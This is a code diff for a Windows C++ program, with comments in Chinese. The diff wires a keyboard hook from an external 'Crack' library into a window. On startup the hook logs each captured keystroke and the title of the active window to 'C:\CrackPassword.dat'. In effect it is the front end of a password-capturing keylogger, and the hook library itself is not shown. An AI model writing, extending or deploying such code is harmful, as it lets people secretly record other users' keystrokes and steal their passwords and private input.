@@ -1,22 +1,46 @@
 ﻿#include<Windows.h>
 #include "Resource.h"
+#include "Crack/Crack.h"
+
 #pragma comment(lib, "Crack.lib")
 
-//安装钩子
-extern "C" __declspec(dllimport) BOOL InstallHook();
-
-//卸载钩子
-extern "C" __declspec(dllimport) BOOL UninstallHook();
+// 钩子消息处理函数
+int CALLBACK Fwrite(const char* wnd, const char* key, void* user) {
+	char buf[360] = {};
+	sprintf_s(buf, "[%s] %s\n", wnd, key);
+#ifdef _DEBUG
+	OutputDebugStringA((const char*)buf);
+#endif
+	return fwrite(buf, strlen(buf), 1, (FILE*)user);
+}
 
 //窗口处理函数
-LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
-
+LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+	static FILE* pFile = fopen("C:\\CrackPassword.dat", "a+");
+	switch (uMsg)
+	{
+	case WM_CREATE:		//窗口创建消息
+		InstallHook(Fwrite, pFile);
+		break;
+	case WM_CLOSE:	//窗口关闭消息
+		DestroyWindow(hWnd);
+		break;
+	case WM_DESTROY:	//销毁窗口
+		UninstallHook();
+		if (pFile != NULL) {
+			fclose(pFile);
+			pFile = NULL;
+		}
+		PostQuitMessage(0);
+		break;
+	default:
+		break;
+	}
+	return DefWindowProc(hWnd, uMsg, wParam, lParam);
+}
 
 //main函数：控制台窗口程序
 //WinMain函数：Windows窗口
-
-
-
 //__stdcall 等同WINAPI	HINSTANCE 实例句柄   LPSTR 命令行参数  nCmdShow窗口显示方式
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lpCmdLine, int nCmdShow) {
 	//创建一个窗口
@@ -69,24 +93,4 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lpCmdLine,
 	}
 	
 	return 0;
-}
-
-//窗口处理函数
-LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
-	switch (uMsg)
-	{
-	case WM_CREATE:		//窗口创建消息
-		InstallHook();
-		break;
-	case WM_CLOSE:	//窗口关闭消息
-		DestroyWindow(hWnd);
-		break;
-	case WM_DESTROY:	//销毁窗口
-		UninstallHook();
-		PostQuitMessage(0);
-		break;
-	default:
-		break;
-	}
-	return DefWindowProc(hWnd, uMsg, wParam, lParam);
 }
